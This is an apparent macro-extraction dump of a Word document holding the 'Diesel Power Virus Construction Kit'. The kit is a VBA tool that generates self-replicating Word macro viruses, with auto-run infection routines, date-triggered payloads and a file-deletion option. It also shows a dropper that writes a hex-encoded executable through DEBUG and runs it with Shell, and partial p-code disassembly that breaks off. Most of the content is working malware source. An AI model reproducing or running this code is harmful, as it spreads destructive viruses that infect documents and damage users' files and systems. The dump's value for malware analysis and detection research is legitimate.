"e 0f10 7c 30 00 00 70 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 c9 30 00 00 b0 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 00 00 00 00 00 00 00 00 00 00 00 00 d4 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 a2 31 00 00 b4 31 00 00 00 00 00 00 d4 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 e2 30 00 00 f6 30 00 00 06 31 00 00 18 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 2a 31 00 00 36 31 00 00 46 31 00 00 5e 31 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 6a 31 00 00 82 31 00 00 8c 31 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 a2 31 00 00 b4 31 00 00 00 00 00 00 4b 45 52 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 45 4c 33 32 2e 64 6c 6c 00 55 53 45 52 33 32 2e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 64 6c 6c 00 00 00 45 78 69 74 50 72 6f 63 65 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 73 00 00 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 64 6c 65 41 00 00 00 00 46 69 6e 64 4e 65 78 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 46 69 6c 65 41 00 00 00 47 65 74 43 6f 6d 6d 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 6e 64 4c 69 6e 65 41 00 00 00 46 69 6e 64 46 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 72 73 74 46 69 6c 65 41 00 00 00 00 43 6f 70 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 46 69 6c 65 41 00 00 00 47 65 74 53 79 73 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 6d 54 69 6d 65 00 00 00 47 65 74 57 69 6e 64 6f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 77 73 44 69 72 65 63 74 6f 72 79 41 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 4d 6f 76 65 46 69 6c 65 41 00 00 00 53 65 74 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 00 00 00 57 69 6e 45 78 65 63 00 00 00 47 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 74 4d 6f 64 75 6c 65 46 69 6c 65 4e 61 6d 65 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 00 00 00 53 77 61 70 4d 6f 75 73 65 42 75 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 74 6f 6e 00 00 00 4d 65 73 73 61 67 65 42 6f 78 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 00 10 00 00 54 00 00 00 0d 30 22 30 2c 30 37 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 46 30 56 30 6a 30 71 30 7c 30 85 30 8f 30 94 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 a9 30 ba 30 bf 30 ce 30 e6 30 02 31 0d 31 23 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 30 31 44 31 58 31 7a 36 80 36 86 36 8c 36 92 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 98 36 9e 36 a4 36 aa 36 b0 36 b6 36 bc 36 c2 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 c8 36 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"1200" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Constructor.MSWord.Ctvck.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim T$
Dim CheckBox1
Dim CheckBox2
Dim CheckBox3
Dim CheckBox4
WordBasic.MsgBox "Diesel Power Virus Construction Kit" + Chr(13) + Chr(13) + _
"       (c) by XaRaBaS [DkpRJ]", "DPVCK v1.0"
WordBasic.BeginDialog 520, 300, "Diesel Power v1.0 VCK" + _
" (c) by XaRaBaS [DkpRJ]"
'----------
WordBasic.GroupBox 10, 10, 300, 110, " Virus info : "
WordBasic.Text 20, 30, 100, 17, "Author:"
WordBasic.TextBox 120, 30, 180, 17, "Author$"
WordBasic.Text 20, 50, 100, 17, "Virus name:"
WordBasic.TextBox 120, 50, 180, 17, "Name$"
WordBasic.Text 20, 70, 100, 17, "Identifier:"
WordBasic.TextBox 120, 70, 180, 17, "Ident$"
WordBasic.Text 20, 90, 100, 17, "Target file:"
WordBasic.TextBox 120, 90, 180, 17, "File$"
'---------
WordBasic.GroupBox 320, 10, 190, 110, " Infected macros : "
WordBasic.CheckBox 330, 30, 100, 17, "AutoNew", "CheckBox1"
WordBasic.CheckBox 330, 50, 100, 17, "AutoClose", "CheckBox2"
WordBasic.CheckBox 330, 70, 100, 17, "AutoExec", "CheckBox3"
WordBasic.CheckBox 330, 90, 100, 17, "FileSaveAs", "CheckBox4"
'---------
WordBasic.GroupBox 10, 130, 300, 140, " Payload : "
WordBasic.OptionGroup "selector"
  WordBasic.OptionButton 20, 150, 100, 17, "No payload"
  WordBasic.OptionButton 20, 170, 100, 17, "Message"
  WordBasic.OptionButton 20, 190, 100, 17, "Kill file"
  WordBasic.OptionButton 20, 210, 280, 17, "Virus " + _
  "FaT DeViL ViRuS by ThAnAtHoS  "
  WordBasic.OptionButton 20, 230, 280, 17, "Virus " + _
  "TeX's GuNs ViRuS by TeX "
  WordBasic.OptionButton 20, 250, 280, 17, "Virus " + _
  "LeNiN ViRuS by XaRaBaS [DkpRJ]"
WordBasic.TextBox 120, 170, 180, 17, "Message$"
WordBasic.TextBox 120, 190, 180, 17, "Kill$"
'----------
WordBasic.GroupBox 320, 130, 190, 140, " Time of payload : "
WordBasic.CheckBox 330, 150, 150, 17, "Year", "TwoBox1"
WordBasic.TextBox 460, 150, 30, 17, "Year$"
WordBasic.CheckBox 330, 170, 150, 17, "Month (1-12)", "TwoBox2"
WordBasic.TextBox 460, 170, 30, 17, "Month$"
WordBasic.CheckBox 330, 190, 150, 17, "Weekday (1-7)", "TwoBox3"
WordBasic.TextBox 460, 190, 30, 17, "Weekday$"
WordBasic.CheckBox 330, 210, 150, 17, "Day (1-31)", "TwoBox4"
WordBasic.TextBox 460, 210, 30, 17, "Day$"
WordBasic.CheckBox 330, 230, 150, 17, "Hour (0-23)", "TwoBox5"
WordBasic.TextBox 460, 230, 30, 17, "Hour$"
WordBasic.CheckBox 330, 250, 150, 17, "Second (0-59)", "TwoBox6"
WordBasic.TextBox 460, 250, 30, 17, "Second$"
'----------
WordBasic.OKButton 100, 275, 90, 20
WordBasic.CancelButton 320, 275, 90, 20
WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
dlg.Author$ = "XaRaBaS [DkpRJ]"
dlg.Name$ = "ThE ReAl PoWeR"
dlg.Ident$ = "DkpRJ"
dlg.File$ = "c:\oil.bas"
On Error GoTo -1: On Error GoTo Clo
WordBasic.Dialog.UserDialog dlg
T$ = Chr(13) + Chr(10)
'----- ???????? ????????? ???????? ??? ???? !!!
If dlg.TwoBox2 = 1 Then
    If (WordBasic.Val(dlg.Month$) < 1) Or (WordBasic.Val(dlg.Month$) > 12) Then
    GoTo ErrNumber
    End If
End If
If dlg.TwoBox3 = 1 Then
    If (WordBasic.Val(dlg.WeekDay$) < 1) Or (WordBasic.Val(dlg.WeekDay$) > 7) Then
    GoTo ErrNumber
    End If
End If
If dlg.TwoBox4 = 1 Then
    If (WordBasic.Val(dlg.Day$) < 1) Or (WordBasic.Val(dlg.Day$) > 31) Then
    GoTo ErrNumber
    End If
End If
If dlg.TwoBox5 = 1 Then
    If (WordBasic.Val(dlg.Hour$) < 0) Or (WordBasic.Val(dlg.Hour$) > 23) Then
    GoTo ErrNumber
    End If
End If
If dlg.TwoBox6 = 1 Then
    If (WordBasic.Val(dlg.Second$) < 0) Or (WordBasic.Val(dlg.Second$) > 59) Then
    GoTo ErrNumber
    End If
End If
GoTo Creator

ErrNumber:
WordBasic.MsgBox "Error in time of payload !", "Diesel Power v1.0", 16
GoTo Clo

Creator:
WordBasic.FileNew
WordBasic.Insert "'======================================================" + T$
WordBasic.Insert "'" + Chr(34) + dlg.Name$ + Chr(34) + " virus by " + _
dlg.Author$ + T$
WordBasic.Insert "'Created with Diesel Power VCK (c)by XaRaBaS [DkpRJ]" + T$
WordBasic.Insert "'======================================================" + T$

WordBasic.Insert "'=== begin of macros AutoOpen" + T$
WordBasic.Insert "Sub MAIN" + T$
WordBasic.Insert "On Error Goto QuitO" + T$
WordBasic.Insert "infected = 0" + T$
WordBasic.Insert "For i = 1 To CountMacros(0, 0)" + T$
WordBasic.Insert Chr(9) + "If MacroName$(i, 0, 0) = " + Chr(34) + _
dlg.Ident$ + Chr(34) + " Then" + T$
WordBasic.Insert Chr(9) + Chr(9) + "infected = - 1" + T$
WordBasic.Insert Chr(9) + "End If" + T$
WordBasic.Insert "Next i" + T$
WordBasic.Insert "If infected = 0 Then" + T$
WordBasic.Insert Chr(9) + "FN$ = FileName$()" + T$
WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoOpen" + _
Chr(34) + ", " + Chr(34) + "Global:AutoOpen" + Chr(34) + T$
WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":" + _
dlg.Ident$ + Chr(34) + ", " + Chr(34) + "Global:" + _
dlg.Ident$ + Chr(34) + T$
If CheckBox1 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoNew" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoNew" + Chr(34) + T$
End If
If CheckBox2 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoClose" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoClose" + Chr(34) + T$
End If
If CheckBox3 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoExec" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoExec" + Chr(34) + T$
End If
If CheckBox4 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + _
    ":FileSaveAs" + Chr(34) + ", " + Chr(34) + _
    "Global:FileSaveAs" + Chr(34) + T$
End If
WordBasic.Insert "End If" + T$
WordBasic.Insert "QuitO:" + T$
WordBasic.Insert "End Sub" + T$
WordBasic.Insert "'=== end of macros AutoOpen" + T$

If dlg.CheckBox1 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoNew" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "On Error Goto QuitN" + T$
    WordBasic.Insert T$
    WordBasic.Insert "Infected = 0" + T$
    WordBasic.Insert "For i = 1 To CountMacros(1, 0)" + T$
    WordBasic.Insert Chr(9) + "If MacroName$(i, 1, 1) = " + Chr(34) + _
    dlg.Ident$ + Chr(34) + " Then" + T$
    WordBasic.Insert Chr(9) + "infected = 1" + T$
    WordBasic.Insert "End If" + T$
    WordBasic.Insert "Next i" + T$
    WordBasic.Insert T$
    WordBasic.Insert "If infected = 1 Then" + T$
    WordBasic.Insert Chr(9) + "Goto QuitN" + T$
    WordBasic.Insert "Else" + T$
    WordBasic.Insert Chr(9) + "On Error Resume Next" + T$
    WordBasic.Insert Chr(9) + "FileSaveAs .Format = 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoOpen" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoOpen" + _
    Chr(34) + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:" + _
    dlg.Ident$ + Chr(34) + ", FileName$() + " + Chr(34) + ":" + _
    dlg.Ident$ + Chr(34) + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoNew" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoNew" + _
    Chr(34) + T$
    If dlg.CheckBox2 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoClose" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoClose" + Chr(34) + T$
    End If
    If dlg.CheckBox3 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoExec" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoExec" + Chr(34) + T$
    End If
    If dlg.CheckBox4 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:FileSaveAs" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":FileSaveAs" + Chr(34) + T$
    End If
    WordBasic.Insert Chr(9) + "FileSaveAll 1, 0" + T$
    WordBasic.Insert "End If" + T$
    WordBasic.Insert T$
    WordBasic.Insert "QuitN:" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoNew" + T$
End If

If dlg.CheckBox2 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoClose" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "On Error Goto QuitC" + T$
    WordBasic.Insert "infected = 0" + T$
    WordBasic.Insert "For i = 1 To CountMacros(1, 0)" + T$
    WordBasic.Insert Chr(9) + "If MacroName$(i, 1, 1) = " + Chr(34) + _
    dlg.Ident$ + Chr(34) + " Then" + T$
    WordBasic.Insert Chr(9) + Chr(9) + "infected = 1" + T$
    WordBasic.Insert Chr(9) + "End If" + T$
    WordBasic.Insert "Next i" + T$
    WordBasic.Insert T$
    WordBasic.Insert "If infected = 1 Then" + T$
    WordBasic.Insert Chr(9) + "Goto QuitC" + T$
    WordBasic.Insert "Else" + T$
    WordBasic.Insert Chr(9) + "On Error Resume Next" + T$
    WordBasic.Insert Chr(9) + "FileSaveAs .Format = 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:" + _
    dlg.Ident$ + Chr(34) + ",FileName$()" + Chr(43) + _
    Chr(34) + ":" + dlg.Ident$ + Chr(34) + ", 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoClose" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoClose" + _
    Chr(34) + ", 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoOpen" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoOpen" + _
    Chr(34) + ", 1" + T$
    If CheckBox1 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoNew" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoNew" + Chr(34) + ", 1" + T$
    End If
    If CheckBox3 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoExec" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoExec" + Chr(34) + ", 1" + T$
    End If
    If CheckBox4 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:FileSaveAs" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":FileSaveAs" + Chr(34) + ", 1" + T$
    End If
    WordBasic.Insert "End If" + T$
    WordBasic.Insert T$
    WordBasic.Insert "QuitC:" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoClose" + T$
End If

If CheckBox3 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoExec" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "Call AutoOpen" + T$
    WordBasic.Insert "Call AutoNew" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoExec" + T$
End If

If CheckBox4 = 1 Then
    WordBasic.Insert "'=== begin of macros FileSaveAs" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "Dim dlg As FileSaveAs" + T$
    WordBasic.Insert "GetCurValues dlg" + T$
    WordBasic.Insert "Dialog dlg" + T$
    WordBasic.Insert "FileSaveAs dlg" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros FileSaveAs" + T$
End If

WordBasic.Insert "'=== begin of macros " + dlg.Ident$ + T$
WordBasic.Insert T$
WordBasic.Insert "'" + Chr(34) + dlg.Name$ + Chr(34) + " virus by " + _
dlg.Author$ + T$
WordBasic.Insert "'Created with Diesel Power VCK (c)by XaRaBaS [DkpRJ]" + T$
WordBasic.Insert T$
If dlg.selector = 0 Then
    GoTo Propusk
End If
If dlg.TwoBox1 = 1 Then
    WordBasic.Insert "if Year(Now()) = " + dlg.Year$ + " Then" + T$
End If
If dlg.TwoBox2 = 1 Then
    WordBasic.Insert "if Month(Now()) = " + dlg.Month$ + " Then" + T$
End If
If dlg.TwoBox3 = 1 Then
    WordBasic.Insert "if Weekday(Now()) = " + dlg.WeekDay$ + " Then" + T$
End If
If dlg.TwoBox4 = 1 Then
    WordBasic.Insert "if Day(Now()) = " + dlg.Day$ + " Then" + T$
End If
If dlg.TwoBox5 = 1 Then
    WordBasic.Insert "if Hour(Now()) = " + dlg.Hour$ + " Then" + T$
End If
If dlg.TwoBox6 = 1 Then
    WordBasic.Insert "if Second(Now()) = " + dlg.Second$ + " Then" + T$
End If
If dlg.selector = 1 Then
   WordBasic.Insert "MsgBox " + Chr(34) + dlg.Message$ + Chr(34) + _
   ", " + Chr(34) + dlg.Ident$ + Chr(34) + T$
End If
If dlg.selector = 2 Then
   WordBasic.Insert "Kill " + Chr(34) + dlg.Kill$ + Chr(34) + T$
End If
If dlg.selector = 3 Then
    WordBasic.Call "Payload1"
End If
If dlg.selector = 4 Then
    WordBasic.Call "Payload2"
End If
If dlg.selector = 5 Then
    WordBasic.Call "Payload3"
End If
If dlg.TwoBox1 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox2 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox3 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox4 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox5 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox6 = 1 Then WordBasic.Insert "End If" + T$
Propusk:
WordBasic.Insert "'=== end of macros " + dlg.Ident$ + T$
WordBasic.FileSaveAs Name:=dlg.File$, Format:=4
WordBasic.FileClose (2)
WordBasic.MsgBox "New virus created !" + Chr(13) + _
"Thanks for using Diesel Power", "DPVCK v1.0"

Clo:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.Ctvck.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Payload3 - 91775 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn T
' Line #3:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St T$ 
' Line #4:
' 	LineCont 0x0004 11 00 00 00
' 	LitStr 0x0005 "Open "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "C:\myscript.scr"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 " For Output As #1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #5:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "n c:\myscript.exe"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #6:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #7:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #8:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #9:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #10:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
